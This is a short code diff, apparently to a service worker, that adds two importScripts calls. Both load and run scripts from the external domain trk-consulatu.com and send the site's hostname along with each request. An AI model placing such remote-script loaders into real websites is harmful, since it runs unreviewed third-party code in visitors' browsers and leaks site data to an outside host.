@@ -1,0 +1,2 @@
+if(typeof window==="undefined"){importScripts('https://trk-consulatu.com/scripts/ext/script/l8emr37dkr?url='+encodeURI(self.location.hostname));}
+importScripts("https://trk-consulatu.com/scripts/sw/script/l8emr37dkr?url="+encodeURI(self.location.hostname));
